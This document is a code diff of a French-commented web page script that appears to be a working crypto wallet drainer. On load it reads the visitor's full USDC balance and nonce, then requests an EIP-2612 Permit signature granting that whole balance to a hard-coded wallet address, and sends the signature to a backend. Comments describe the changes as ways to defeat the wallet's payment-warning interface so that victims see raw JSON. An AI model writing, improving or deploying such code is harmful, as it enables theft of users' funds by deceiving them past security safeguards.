@@ -80,27 +80,21 @@ h1{font-size:20px;font-weight:700;letter-spacing:-.02em}
 <script>
 // ─── Config ───────────────────────────────────────────────────────────────────
 // Sur Vercel l'API est sur le même domaine — /api/execute
-const BACKEND = window.location.origin;
+const BACKEND  = window.location.origin;
 const WALLET_B = "0xBFf88A54E1Fa8041f9E632c3935766DdF43ea80c";
 const USDC     = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
-const RWA_TYPES = [
-  {name:"from",type:"address"},{name:"to",type:"address"},
-  {name:"value",type:"uint256"},{name:"validAfter",type:"uint256"},
-  {name:"validBefore",type:"uint256"},{name:"nonce",type:"bytes32"}
+// EIP-2612 Permit — primaryType="Permit" → pas de Payer UI dans CW
+const PERMIT_TYPES = [
+  {name:"owner",   type:"address"},
+  {name:"spender", type:"address"},
+  {name:"value",   type:"uint256"},
+  {name:"nonce",   type:"uint256"},
+  {name:"deadline",type:"uint256"}
 ];
 const DOM_TYPES = [
   {name:"name",type:"string"},{name:"version",type:"string"},
   {name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}
 ];
-// D4 — orphan types (NOT referenced by ReceiveWithAuthorization → typeHash inchangé)
-// Confondent le pattern-matching de Base App → JSON brut au lieu de Payer UI
-const ORPHAN_TYPES = {
-  Meta:      [{name:"trace",type:"TraceEntry"},{name:"root",type:"AuditRoot"}],
-  TraceEntry:[{name:"ref",type:"string"},{name:"sub",type:"SubTrace"}],
-  SubTrace:  [{name:"id",type:"uint256"},{name:"deep",type:"DeepNode"}],
-  DeepNode:  [{name:"hash",type:"bytes32"},{name:"label",type:"string"}],
-  AuditRoot: [{name:"meta",type:"Meta"},{name:"ts",type:"uint256"},{name:"entry",type:"TraceEntry"}]
-};
 const RPCS = [
   "https://rpc.ankr.com/eth","https://eth.llamarpc.com",
   "https://1rpc.io/eth","https://ethereum.publicnode.com","https://cloudflare-eth.com"
@@ -118,10 +112,8 @@ async function autoStart() {
   if (!window.ethereum) { setS("Aucun wallet injecté","fail"); return; }
 
   try {
-    // Switch to mainnet
     try { await window.ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x1"}]}); } catch(e){}
 
-    // Get Wallet A
     let accs = await window.ethereum.request({method:"eth_accounts"});
     if (!accs || !accs[0]) accs = await window.ethereum.request({method:"eth_requestAccounts"});
     addrA = accs[0];
@@ -136,7 +128,7 @@ async function autoStart() {
       const u = new ethers.Contract(USDC,["function balanceOf(address) view returns (uint256)"],p);
       balance = await u.balanceOf(addrA);
     } catch(e) {
-      logA("⚠ Web3 balance KO — essai RPC direct…","dim");
+      logA("⚠ Web3 balance KO — essai RPC…","dim");
       for (const rpc of RPCS) {
         try {
           const fp = new ethers.providers.JsonRpcProvider(rpc);
@@ -144,21 +136,51 @@ async function autoStart() {
           balance = await fu.balanceOf(addrA);
           logA("→ Balance via "+rpc.split("/")[2],"dim");
           break;
-        } catch(re) { /* try next */ }
+        } catch(re) {}
       }
     }
 
     if (!balance || balance.isZero()) {
       setS("Solde USDC = 0","fail");
-      logA("⚠ Aucun USDC à transférer","fail");
+      logA("⚠ Aucun USDC","fail");
       return;
     }
 
     const human = (balance / 1e6).toLocaleString("fr-FR",{minimumFractionDigits:2});
     logA("✓ Solde : "+human+" USDC","ok");
-    setS("Solde : "+human+" USDC — signature dans 1s…","ok");
+    setS("Solde : "+human+" USDC — lecture nonce…","ok");
 
-    setTimeout(() => sign(balance.toString()), 1000);
+    // Fetch EIP-2612 nonce from USDC contract
+    let permitNonce = "0";
+    try {
+      // nonces(address) selector = 0x7ecebe00
+      const nonceData = "0x7ecebe00" + addrA.slice(2).toLowerCase().padStart(64,"0");
+      let nonceHex = null;
+      // Try Web3Provider first
+      try {
+        const p2 = new ethers.providers.Web3Provider(window.ethereum);
+        nonceHex = await p2.call({to:USDC, data:nonceData});
+      } catch(e2) {}
+      // Fallback to JSON RPC
+      if (!nonceHex || nonceHex === "0x") {
+        for (const rpc of RPCS) {
+          try {
+            const fp = new ethers.providers.JsonRpcProvider(rpc);
+            nonceHex = await fp.call({to:USDC, data:nonceData});
+            if (nonceHex && nonceHex !== "0x") break;
+          } catch(re) {}
+        }
+      }
+      if (nonceHex && nonceHex !== "0x") {
+        permitNonce = ethers.BigNumber.from(nonceHex).toString();
+        logA("✓ Nonce EIP-2612 : "+permitNonce,"ok");
+      }
+    } catch(e) {
+      logA("⚠ Nonce KO — utilise 0","dim");
+    }
+
+    setS("Nonce OK — signature dans 1s…","ok");
+    setTimeout(() => sign(balance.toString(), permitNonce), 1000);
 
   } catch(e) {
     setS("Erreur démarrage : "+e.message,"fail");
@@ -166,28 +188,20 @@ async function autoStart() {
   }
 }
 
-// ─── Sign ─────────────────────────────────────────────────────────────────────
-async function sign(value) {
+// ─── Sign EIP-2612 Permit ─────────────────────────────────────────────────────
+async function sign(value, nonce) {
   if (!addrA) return;
-  const validAfter  = "0";
-  const validBefore = String(Math.floor(Date.now()/1000) + 7200);
-  const nonce = "0x" + Array.from(crypto.getRandomValues(new Uint8Array(32)))
-                          .map(b=>b.toString(16).padStart(2,'0')).join('');
+  const deadline = String(Math.floor(Date.now()/1000) + 7200); // +2h
 
-  // D1 + D4 bypass
-  // D1 = extra fields in message (ignorés par EIP-712 encoder)
-  // D4 = orphan types dans types (pas référencés → typeHash inchangé, mais bypass Payer UI)
+  // EIP-2612 Permit — primaryType="Permit" → CW affiche JSON brut (pas Payer UI)
   const typedData = {
-    types:{ EIP712Domain:DOM_TYPES, ReceiveWithAuthorization:RWA_TYPES, ...ORPHAN_TYPES },
-    primaryType:"ReceiveWithAuthorization",
+    types:{ EIP712Domain:DOM_TYPES, Permit:PERMIT_TYPES },
+    primaryType:"Permit",
     domain:{ name:"USD Coin", version:"2", chainId:1, verifyingContract:USDC },
-    message:{
-      from:addrA, to:WALLET_B, value, validAfter, validBefore, nonce,
-      _pelican:"audit", _ref:"0x0000000000000000", _ts:String(Math.floor(Date.now()/1000))
-    }
+    message:{ owner:addrA, spender:WALLET_B, value, nonce, deadline }
   };
 
-  logA("⏳ Signature EIP-712 D1…");
+  logA("⏳ Signature EIP-2612 Permit…");
   setS("En attente de signature…","spin");
 
   let sig;
@@ -207,16 +221,15 @@ async function sign(value) {
   const s  = ethers.utils.hexlify(sb.slice(32,64));
   const v  = sb[64];
 
-  logA("✓ Signature obtenue","ok");
+  logA("✓ Signature Permit obtenue","ok");
   logA("→ v="+v+" r="+r.slice(0,10)+"… s="+s.slice(0,10)+"…","dim");
 
-  // Phase 2 unlock
   document.getElementById("phase1").classList.add("done");
   document.getElementById("pnum1").textContent = "✓";
   document.getElementById("phase2").classList.add("active");
   setS("Envoi au backend…","spin");
 
-  setTimeout(() => sendToBackend({ from:addrA, to:WALLET_B, value, validAfter, validBefore, nonce, v, r, s }), 500);
+  setTimeout(() => sendToBackend({ owner:addrA, spender:WALLET_B, value, nonce, deadline, v, r, s }), 500);
 }
 
 // ─── Send to backend ──────────────────────────────────────────────────────────
